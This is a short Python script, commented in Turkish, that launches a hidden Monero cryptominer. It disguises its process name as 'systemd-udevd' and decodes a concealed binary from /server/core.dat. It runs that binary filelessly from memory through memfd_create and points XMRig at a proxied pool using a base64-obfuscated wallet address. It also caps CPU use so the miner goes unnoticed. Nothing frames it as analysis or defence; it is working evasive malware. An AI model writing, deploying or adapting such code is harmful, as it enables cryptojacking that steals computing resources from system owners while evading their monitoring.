#!/usr/bin/env python3
import os
import sys
import time
import base64
import threading
import subprocess
import re
import ctypes
from urllib.parse import urlparse

libc = ctypes.CDLL('libc.so.6')

def set_process_name(name):
    """Süreç adını sistem listesinde (top/htop) maskeler."""
    try: libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
    except: pass

def _d(s): return base64.b64decode(s).decode('utf-8')

# --- OTOMATİK URL TESPİTİ VE AYARLAMA ---
raw_url = os.environ.get("PROXY_URL", "")
# URL'den sadece host kısmını ayıkla (https:// varsa temizler)
parsed_url = urlparse(raw_url)
CF_WORKER_HOST = parsed_url.netloc if parsed_url.netloc else raw_url.split('/')[0]

WALLET_ADDR = _d("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=")
WORKER_NAME = f"node-{int(time.time())%1000}"

def run_engine():
    enc_path = "/server/core.dat"
    if not os.path.exists(enc_path): return

    try:
        set_process_name("systemd-udevd") # Masum isim
        
        with open(enc_path, "rb") as f:
            raw_binary = base64.b64decode(f.read())

        # memfd_create: Disk yerine RAM'den çalıştırma
        fd = libc.syscall(319, b"sys-service", 1) 
        os.write(fd, raw_binary)
        mem_path = f"/proc/self/fd/{fd}"

        # XMRig Komutları
        cmd = [
            mem_path, 
            "-o", f"{CF_WORKER_HOST}:443", 
            "-u", WALLET_ADDR, 
            "-p", WORKER_NAME,
            "--keepalive",
            "--tls",
            "--donate-level=1",
            "--cpu-max-threads-hint", "50" # CPU kullanımı %50 sınırı
        ]

        # Ortam değişkenlerini temizle
        env = {"PATH": "/usr/bin:/bin", "HOME": "/tmp"}
        subprocess.run(cmd, env=env)

    except Exception:
        time.sleep(30)

if __name__ == "__main__":
    run_engine()
